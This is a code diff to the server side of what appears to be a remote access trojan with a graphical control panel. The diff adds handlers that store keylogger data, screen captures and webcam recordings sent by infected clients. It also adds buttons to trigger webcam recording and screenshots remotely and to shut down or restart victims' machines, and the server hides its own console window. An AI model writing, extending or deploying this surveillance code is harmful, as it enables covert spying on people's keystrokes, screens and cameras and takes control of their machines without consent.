@@ -10,13 +10,13 @@
 #include "ThreadWrapper.hpp"
 #include "Message.hpp"
 #include "ImGuiScrollableText.hpp"
-#include "FunctionalityStruct.hpp"
 
-#define DEFAULT_BUFLEN 2048
 #define DEFAULT_PORT 62300
 
 std::map<std::string, uint32_t> clientNamingPool;
 GuiScrollableTextDisplay miniConsole;
+
+const std::string serverTempFolderName = "server_tmp";  //must not be empty string !
 
 ///////////////////////////////////////////////////////
 
@@ -44,14 +44,12 @@ public:
         return name + "##" + getPeerIpPort() + '_' + postfix;
     }
 
-    FunctionalityStruct funcStruct;
-
 private:
     void executeMessage(const Message& msg) {
         switch(msg.commandNumber) {
             case MessageDisableKeylog: {
-                std::string filename = "keylog_" + getCurrentIsoTime() + ".txt";
-                std::ofstream outfile(filename);
+                std::string filename = serverTempFolderName + "/keylog_" + getCurrentIsoTime() + ".txt";
+                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
                 if(!outfile) {
                     miniConsole.AddLineError("Keylogger data failed to save to file");
                     break;
@@ -61,6 +59,30 @@ private:
                 miniConsole.AddLineInfo("Keylogger data saved to file %s", filename.c_str());
                 break;
             }
+            case MessageScreenCap: {
+                std::string filename = serverTempFolderName + "/screencap_" + getCurrentIsoTime() + ".jpg";
+                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
+                if(!outfile) {
+                    miniConsole.AddLineError("Screencap data failed to save to file");
+                    break;
+                }
+                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
+                outfile.close();
+                miniConsole.AddLineInfo("Screencap data saved to file %s", filename.c_str());
+                break;
+            } 
+            case MessageInvokeWebcam: {
+                std::string filename = serverTempFolderName + "/webcam_" + getCurrentIsoTime() + ".mp4";
+                std::ofstream outfile(filename, std::ios::out | std::ios::binary);
+                if(!outfile) {
+                    miniConsole.AddLineError("webcam data failed to save to file");
+                    break;
+                }
+                outfile.write(msg.getBinaryData(), msg.getBinaryDataSize());
+                outfile.close();
+                miniConsole.AddLineInfo("webcam data saved to file %s", filename.c_str());
+                break;
+            } 
         }
     }
 
@@ -73,7 +95,7 @@ private:
                     Message msg;
                     if (processCompleteMessage(msg)) {
                         miniConsole.AddLineSuccess("Successfully proceeded message %s", this->getPeerIpPort().c_str());
-                        std::thread([&msg, this]() {
+                        std::thread([msg, this]() {
                             executeMessage(msg);
                         }).detach();
                     } else {
@@ -323,7 +345,7 @@ void RunGui() {
             ImGui::InputTextMultiline(client.makeWidgetName("Message Input").c_str(), &client.funcStruct.rawText, ImVec2(-1, 60));
             
             // Send button
-            if (ImGui::Button(client.makeWidgetName("Send Message").c_str())) {
+            if (ImGui::Button(client.makeWidgetName("Send raw text").c_str())) {
                 if (client.funcStruct.rawText.size() > 0) {
                     std::thread([&client] {
                         Message textMessage;
@@ -339,17 +361,6 @@ void RunGui() {
                         }
                     }).detach();
                 }
-            }
-            
-            ImGui::SameLine();
-            
-            // Kick button
-            if (ImGui::Button(client.makeWidgetName("Kick Client").c_str())) {
-                std::thread([&client] {
-                    client.disconnect();
-                    miniConsole.AddLineWarning("Kicked client %s", client.getPeerIpPort().c_str());
-                }).detach();
-                clientVector.removeInactive();
             }
 
             if(ImGui::Checkbox("Func: Keylogger", &client.funcStruct.isKeyloggerActive)) {  //click -> already changed the state
@@ -380,6 +391,73 @@ void RunGui() {
                         }
                     }).detach();
                 }
+            }
+            
+            if(ImGui::Button(client.makeWidgetName("Invoke webcam").c_str())) {
+                std::thread([&client] {
+                    Message msg;
+                    msg.commandNumber = MessageInvokeWebcam;
+                    json jsonData;
+                    jsonData["millisecond"] = client.funcStruct.webcamDurationMs;
+                    msg.setJsonData(jsonData);
+                    if (client.sendData(msg)) {
+                        miniConsole.AddLineSuccess("Invoke Webcam Message sent to %s", client.getPeerIpPort().c_str());
+                    } else {
+                        miniConsole.AddLineError("Failed to send Invoke Webcam message to %s", client.getPeerIpPort().c_str());
+                    }
+                }).detach();
+            }
+            if(ImGui::InputInt("Invoke webcam duration (in millisecond)", &client.funcStruct.webcamDurationMs)) {
+                if(client.funcStruct.webcamDurationMs < 1000) client.funcStruct.webcamDurationMs = 1000;
+                if(client.funcStruct.webcamDurationMs > 2000000000) client.funcStruct.webcamDurationMs = 2000000000;
+            }
+
+            if(ImGui::Button(client.makeWidgetName("Take Screenshot").c_str())) {
+                std::thread([&client] {
+                    Message msg;
+                    msg.commandNumber = MessageScreenCap;
+                    if (client.sendData(msg)) {
+                        miniConsole.AddLineSuccess("Take Screenshot Message sent to %s", client.getPeerIpPort().c_str());
+                    } else {
+                        miniConsole.AddLineError("Failed to send Take Screenshot message to %s", client.getPeerIpPort().c_str());
+                    }
+                }).detach();
+            }
+
+            ImGui::SeparatorText("Special action");
+
+            if(ImGui::Button(client.makeWidgetName("Shutdown").c_str())) {
+                std::thread([&client] {
+                    Message msg;
+                    msg.commandNumber = MessageShutdownMachine;
+                    if (client.sendData(msg)) {
+                        miniConsole.AddLineSuccess("Shutdown Message sent to %s", client.getPeerIpPort().c_str());
+                    } else {
+                        miniConsole.AddLineError("Failed to send Shutdown message to %s", client.getPeerIpPort().c_str());
+                    }
+                }).detach();
+            }
+
+            if(ImGui::Button(client.makeWidgetName("Restart").c_str())) {
+                std::thread([&client] {
+                    Message msg;
+                    msg.commandNumber = MessageRestartMachine;
+                    if (client.sendData(msg)) {
+                        miniConsole.AddLineSuccess("Restart Message sent to %s", client.getPeerIpPort().c_str());
+                    } else {
+                        miniConsole.AddLineError("Failed to send Restart message to %s", client.getPeerIpPort().c_str());
+                    }
+                }).detach();
+            }
+
+            ImGui::SeparatorText("Kick");
+            // Kick button
+            if (ImGui::Button(client.makeWidgetName("Kick Client").c_str())) {
+                std::thread([&client] {
+                    client.disconnect();
+                    miniConsole.AddLineWarning("Kicked client %s", client.getPeerIpPort().c_str());
+                }).detach();
+                clientVector.removeInactive();
             }
         }
         clientVector.removeInactive();
@@ -438,6 +516,11 @@ int main(void) {
     HWND hwnd = GetConsoleWindow();
     ShowWindow(hwnd, SW_HIDE);
     #endif
+
+    if(!CreateDirectoryCrossPlatform(serverTempFolderName)) {
+        std::cerr << "Fatal error: Can't create folder for temporary server data\n";
+        return -1;
+    }
 
     WSADATA wsaData;
     // Initialize Winsock
